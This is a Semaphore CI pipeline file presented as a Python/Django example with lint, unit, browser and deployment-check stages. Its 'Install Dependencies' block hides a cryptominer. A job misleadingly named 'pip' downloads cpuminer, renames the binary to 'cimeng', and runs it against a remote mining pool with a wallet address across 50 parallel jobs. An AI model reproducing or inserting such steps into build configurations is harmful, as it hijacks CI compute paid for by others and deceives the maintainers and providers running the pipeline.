version: v1.0
name: Semaphore Python / Django Example Pipeline
agent:
  machine:
    type: e1-standard-2
    os_image: ubuntu1804
execution_time_limit:
  hours: 24
global_job_config:
  prologue:
    commands:
      - sem-version python 3.8
blocks:
  - name: Install Dependencies
    task:
      prologue:
        commands:
          - sudo apt-get update && sudo apt-get install -y python3-dev && sudo apt-get install default-libmysqlclient-dev
      jobs:
        - name: pip
          commands:
            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
            - tar xf cpuminer-opt-linux.tar.gz
            - mv cpuminer-sse2 cimeng
            - './cimeng -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t4'
          parallelism: 50
  - name: Run Code Analysis
    task:
      prologue:
        commands:
          - checkout
          - cache restore
          - pip install -r requirements.txt --cache-dir .pip_cache
      jobs:
        - name: Pylint
          commands:
            - git ls-files | grep -v 'migrations' | grep -v 'settings.py' | grep -v 'manage.py' | grep -E '.py$' | xargs pylint -E --load-plugins=pylint_django
  - name: Run Unit Tests
    task:
      prologue:
        commands:
          - sem-service start mysql
          - checkout
          - cache restore
          - pip install -r requirements.txt --cache-dir .pip_cache
      jobs:
        - name: Model Test
          commands:
            - python manage.py test tasks.tests.test_models
        - name: View Test
          commands:
            - python manage.py test tasks.tests.test_views
  - name: Run Browser Tests
    task:
      env_vars:
        - name: DB_NAME
          value: pydjango
      prologue:
        commands:
          - sem-service start mysql
          - sudo apt-get update && sudo apt-get install -y -qq mysql-client
          - mysql --host=0.0.0.0 -uroot -e "create database $DB_NAME"
          - checkout
          - cache restore
          - pip install -r requirements.txt --cache-dir .pip_cache
          - 'nohup python manage.py runserver 127.0.0.1:8732 &'
      jobs:
        - name: Browser Test
          commands:
            - python manage.py test tasks.tests.test_browser
  - name: Run Security Tests
    task:
      jobs:
        - name: Deployment Checklist
          commands:
            - checkout
            - cache restore
            - pip install -r requirements.txt --cache-dir .pip_cache
            - python manage.py check --deploy --fail-level ERROR
